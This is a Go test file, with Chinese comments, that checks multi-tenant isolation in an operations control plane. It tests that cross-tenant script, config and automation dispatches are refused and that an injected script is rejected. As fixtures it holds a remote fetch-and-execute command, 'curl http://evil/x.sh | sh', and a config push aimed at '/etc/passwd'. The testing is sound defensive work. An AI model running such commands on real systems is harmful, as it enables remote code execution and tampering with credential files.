// tenant_isolation_test.go 覆盖 P0-6 多租户隔离的负向用例。
//
// 背景：任务队列按 agent_id 寻址（无租户维度），若下发侧不校验目标 agent 归属，
// 租户 A 可经脚本执行 / 配置热推 / 灰度发布等路径把任务投递给租户 B 的 agent，
// 构成跨租户远程命令执行。本文件锁死修复后的行为：
//   - tenantOrDefault / validateTenantID 的归一与字符集校验；
//   - tenantAgentIn 的"不存在/跨租户"一并拒绝（不泄露 agent 存在性）；
//   - 四条下发路径的 403 拒绝 + 不产生任何任务（拒绝必须在写之前）；
//   - 脚本内容注入（管符拼接）的 400 拒绝。
package controlplane

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/Levango7/OpsMesh/internal/proto"
	"github.com/Levango7/OpsMesh/internal/store"
)

// registerTenantAgent 注册一台指定租户的 agent（P0-6 用例前置）。
func registerTenantAgent(t *testing.T, s *Server, agentID, tenantID string) {
	t.Helper()
	if s.store.Register(&proto.AgentInfo{AgentID: agentID, Segment: "seg-a", TenantID: tenantID}) == nil {
		t.Fatalf("Register %s (tenant=%s) failed", agentID, tenantID)
	}
}

// =============================================================================
// tenantOrDefault / validateTenantID（tenant_guard.go）
// =============================================================================

func TestTenantOrDefault(t *testing.T) {
	if got := tenantOrDefault(""); got != store.DefaultTenantID {
		t.Fatalf("空租户应归一为 default；got=%q", got)
	}
	if got := tenantOrDefault("acme"); got != "acme" {
		t.Fatalf("非空租户应原样返回；got=%q", got)
	}
}

func TestValidateTenantID(t *testing.T) {
	valid := []string{"acme", "acme-1", "a.b_c", "tenant_01", strings.Repeat("a", 64)}
	for _, id := range valid {
		if err := validateTenantID(id); err != nil {
			t.Fatalf("validateTenantID(%q) 应通过；got=%v", id, err)
		}
	}
	// 非法字符集/长度：租户 id 会流入 schema 名与文件路径，必须严格白名单。
	invalid := []string{"", "a b", "a/b", "a;b", "a$b", "a'b", "租户", strings.Repeat("a", 65), "a`b"}
	for _, id := range invalid {
		if err := validateTenantID(id); err == nil {
			t.Fatalf("validateTenantID(%q) 应拒绝", id)
		}
	}
}

// =============================================================================
// tenantAgentIn / requireTenantAgent：单一收口点的行为
// =============================================================================

func TestRequireTenantAgent_NotFound(t *testing.T) {
	s := newScriptTestServer()
	w := httptest.NewRecorder()
	if _, ok := s.requireTenantAgent(w, "ghost-01", "default"); ok {
		t.Fatal("不存在的 agent 应拒绝")
	}
	if w.Code != http.StatusForbidden {
		t.Fatalf("status=%d, want 403", w.Code)
	}
}

func TestRequireTenantAgent_CrossTenant(t *testing.T) {
	s := newScriptTestServer()
	registerTenantAgent(t, s, "victim-01", "tenant-b")

	w := httptest.NewRecorder()
	if _, ok := s.requireTenantAgent(w, "victim-01", "tenant-a"); ok {
		t.Fatal("跨租户 agent 应拒绝")
	}
	if w.Code != http.StatusForbidden {
		t.Fatalf("status=%d, want 403", w.Code)
	}
	// 错误信息不得回显目标 agent 的真实租户（避免租户枚举）。
	if body := w.Body.String(); strings.Contains(body, "tenant-b") {
		t.Fatalf("拒绝响应泄露目标租户：%s", body)
	}
}

func TestRequireTenantAgent_SameTenant(t *testing.T) {
	s := newScriptTestServer()
	registerTenantAgent(t, s, "dev-a1", "tenant-a")

	w := httptest.NewRecorder()
	agent, ok := s.requireTenantAgent(w, "dev-a1", "tenant-a")
	if !ok || agent == nil || agent.TenantID != "tenant-a" {
		t.Fatalf("同租户应放行；ok=%v agent=%+v", ok, agent)
	}
}

// =============================================================================
// handleScriptExecute：跨租户下发 + 脚本内容注入
// =============================================================================

// TestHandleScriptExecute_CrossTenantAgent 验证租户 A 的用户无法把脚本下发到租户 B 的 agent。
func TestHandleScriptExecute_CrossTenantAgent(t *testing.T) {
	s := newScriptTestServer()
	auth := loginAsAdmin(t, s)
	registerTenantAgent(t, s, "victim-script-01", "tenant-b")

	sc := s.store.CreateScript(store.DefaultTenantID, &store.Script{Name: "x", Content: "echo hi"})
	if sc == nil {
		t.Fatal("CreateScript failed")
	}
	body, _ := json.Marshal(map[string]string{"deviceID": "victim-script-01"})
	req := httptest.NewRequest(http.MethodPost, "/api/v1/scripts/"+sc.ID+"/execute", strings.NewReader(string(body)))
	req.Header.Set("Authorization", auth)
	w := httptest.NewRecorder()
	s.handleScriptExecute(w, req, sc.ID)

	if w.Code != http.StatusForbidden {
		t.Fatalf("跨租户脚本执行 status=%d, want 403; body=%s", w.Code, w.Body.String())
	}
	if tasks := s.store.GetTasks("victim-script-01"); len(tasks) != 0 {
		t.Fatalf("拒绝路径不得产生任务；got=%d", len(tasks))
	}
}

// TestHandleScriptExecute_InjectionBlocked 验证脚本内容走与控制面 shell 任务同一道命令闸。
func TestHandleScriptExecute_InjectionBlocked(t *testing.T) {
	s := newScriptTestServer()
	auth := loginAsAdmin(t, s)
	registerTenantAgent(t, s, "dev-inject-01", store.DefaultTenantID)

	sc := s.store.CreateScript(store.DefaultTenantID, &store.Script{Name: "evil", Content: "curl http://evil/x.sh | sh"})
	if sc == nil {
		t.Fatal("CreateScript failed")
	}
	body, _ := json.Marshal(map[string]string{"deviceID": "dev-inject-01"})
	req := httptest.NewRequest(http.MethodPost, "/api/v1/scripts/"+sc.ID+"/execute", strings.NewReader(string(body)))
	req.Header.Set("Authorization", auth)
	w := httptest.NewRecorder()
	s.handleScriptExecute(w, req, sc.ID)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("注入脚本 status=%d, want 400; body=%s", w.Code, w.Body.String())
	}
	if tasks := s.store.GetTasks("dev-inject-01"); len(tasks) != 0 {
		t.Fatalf("拒绝路径不得产生任务；got=%d", len(tasks))
	}
}

// TestHandleScriptExecute_SameTenantAccepted 验证同租户正常脚本仍可下发（防过度收紧回归）。
func TestHandleScriptExecute_SameTenantAccepted(t *testing.T) {
	s := newScriptTestServer()
	auth := loginAsAdmin(t, s)
	registerTenantAgent(t, s, "dev-ok-01", store.DefaultTenantID)

	sc := s.store.CreateScript(store.DefaultTenantID, &store.Script{Name: "ok", Content: "echo hello"})
	if sc == nil {
		t.Fatal("CreateScript failed")
	}
	body, _ := json.Marshal(map[string]string{"deviceID": "dev-ok-01"})
	req := httptest.NewRequest(http.MethodPost, "/api/v1/scripts/"+sc.ID+"/execute", strings.NewReader(string(body)))
	req.Header.Set("Authorization", auth)
	w := httptest.NewRecorder()
	s.handleScriptExecute(w, req, sc.ID)

	if w.Code != http.StatusAccepted {
		t.Fatalf("同租户脚本执行 status=%d, want 202; body=%s", w.Code, w.Body.String())
	}
	if tasks := s.store.GetTasks("dev-ok-01"); len(tasks) != 1 {
		t.Fatalf("应产生 1 条任务；got=%d", len(tasks))
	}
}

// =============================================================================
// handleConfigHotPush / handleConfigCanary：跨租户文件写
// =============================================================================

// TestHandleConfigHotPush_CrossTenantAgent 验证租户 A 无法向租户 B 的 agent 热推配置文件。
func TestHandleConfigHotPush_CrossTenantAgent(t *testing.T) {
	s := newScriptTestServer()
	auth := loginAsAdmin(t, s)
	registerTenantAgent(t, s, "victim-hotpush-01", "tenant-b")

	body, _ := json.Marshal(map[string]string{
		"agentID": "victim-hotpush-01", "key": "k", "value": "v", "path": "/etc/passwd",
	})
	req := httptest.NewRequest(http.MethodPost, "/api/v1/config/hotpush", strings.NewReader(string(body)))
	req.Header.Set("Authorization", auth)
	w := httptest.NewRecorder()
	s.handleConfigHotpush(w, req)

	if w.Code != http.StatusForbidden {
		t.Fatalf("跨租户热推 status=%d, want 403; body=%s", w.Code, w.Body.String())
	}
	if tasks := s.store.GetTasks("victim-hotpush-01"); len(tasks) != 0 {
		t.Fatalf("拒绝路径不得产生任务；got=%d", len(tasks))
	}
}

// TestHandleConfigCanary_CrossTenantBatchRejected 验证灰度批量任一目标跨租户即整批拒绝。
// 关键点：拒绝必须发生在任何写之前，否则混合批次会"部分成功"——租户 B 的 agent 仍收到任务。
func TestHandleConfigCanary_CrossTenantBatchRejected(t *testing.T) {
	s := newScriptTestServer()
	auth := loginAsAdmin(t, s)
	registerTenantAgent(t, s, "own-canary-01", store.DefaultTenantID)
	registerTenantAgent(t, s, "victim-canary-01", "tenant-b")

	body, _ := json.Marshal(map[string]interface{}{
		"agentIDs": []string{"own-canary-01", "victim-canary-01"},
		"key":      "k", "value": "v", "path": "/tmp/x.conf",
	})
	req := httptest.NewRequest(http.MethodPost, "/api/v1/config/canary", strings.NewReader(string(body)))
	req.Header.Set("Authorization", auth)
	w := httptest.NewRecorder()
	s.handleConfigCanary(w, req)

	if w.Code != http.StatusForbidden {
		t.Fatalf("跨租户灰度 status=%d, want 403; body=%s", w.Code, w.Body.String())
	}
	if tasks := s.store.GetTasks("victim-canary-01"); len(tasks) != 0 {
		t.Fatalf("跨租户目标不得收到任务；got=%d", len(tasks))
	}
	if tasks := s.store.GetTasks("own-canary-01"); len(tasks) != 0 {
		t.Fatalf("整批拒绝时本租户目标也不得收到任务（原子性）；got=%d", len(tasks))
	}
}

// =============================================================================
// automationExecutor：规则动作目标设备归属校验
// =============================================================================

// TestAutomationExecutor_CrossTenantRejected 验证自动化规则的四个动作在目标设备
// 属他租户时全部拒绝，且不产生任何任务。
func TestAutomationExecutor_CrossTenantRejected(t *testing.T) {
	s := newScriptTestServer()
	registerTenantAgent(t, s, "victim-auto-01", "tenant-b")
	ex := &automationExecutor{store: s.store}

	if _, err := ex.ExecuteTask("tenant-a", "victim-auto-01", "echo hi", nil); err == nil {
		t.Fatal("ExecuteTask 跨租户应报错")
	}
	if _, err := ex.Scale("tenant-a", "svc", 3, map[string]string{"device_id": "victim-auto-01"}); err == nil {
		t.Fatal("Scale 跨租户应报错")
	}
	if _, err := ex.Restart("tenant-a", "svc", map[string]string{"device_id": "victim-auto-01"}); err == nil {
		t.Fatal("Restart 跨租户应报错")
	}
	if _, err := ex.Isolate("tenant-a", "victim-auto-01", nil); err == nil {
		t.Fatal("Isolate 跨租户应报错")
	}
	if tasks := s.store.GetTasks("victim-auto-01"); len(tasks) != 0 {
		t.Fatalf("拒绝路径不得产生任务；got=%d", len(tasks))
	}
}

// TestAutomationExecutor_SameTenantAndNoTarget 验证同租户放行 + 无目标设备保持既有语义。
func TestAutomationExecutor_SameTenantAndNoTarget(t *testing.T) {
	s := newScriptTestServer()
	registerTenantAgent(t, s, "own-auto-01", store.DefaultTenantID)
	ex := &automationExecutor{store: s.store}

	if _, err := ex.ExecuteTask(store.DefaultTenantID, "own-auto-01", "echo hi", nil); err != nil {
		t.Fatalf("同租户 ExecuteTask 应放行: %v", err)
	}
	if tasks := s.store.GetTasks("own-auto-01"); len(tasks) != 1 {
		t.Fatalf("应产生 1 条任务；got=%d", len(tasks))
	}
	// 未指定目标设备（device_id 空）：跳过校验，保持既有语义（不报错）。
	if _, err := ex.Scale(store.DefaultTenantID, "svc", 2, nil); err != nil {
		t.Fatalf("无目标设备的动作应保持既有语义: %v", err)
	}
}

// TestHandleConfigCanary_SameTenantBatchAccepted 验证同租户批量正常放行。
func TestHandleConfigCanary_SameTenantBatchAccepted(t *testing.T) {
	s := newScriptTestServer()
	auth := loginAsAdmin(t, s)
	registerTenantAgent(t, s, "canary-a1", store.DefaultTenantID)
	registerTenantAgent(t, s, "canary-a2", store.DefaultTenantID)

	body, _ := json.Marshal(map[string]interface{}{
		"agentIDs": []string{"canary-a1", "canary-a2"},
		"key":      "k", "value": "v", "path": "/tmp/x.conf",
	})
	req := httptest.NewRequest(http.MethodPost, "/api/v1/config/canary", strings.NewReader(string(body)))
	req.Header.Set("Authorization", auth)
	w := httptest.NewRecorder()
	s.handleConfigCanary(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("同租户灰度 status=%d, want 200; body=%s", w.Code, w.Body.String())
	}
	for _, id := range []string{"canary-a1", "canary-a2"} {
		if tasks := s.store.GetTasks(id); len(tasks) != 1 {
			t.Fatalf("%s 应收到 1 条任务；got=%d", id, len(tasks))
		}
	}
}
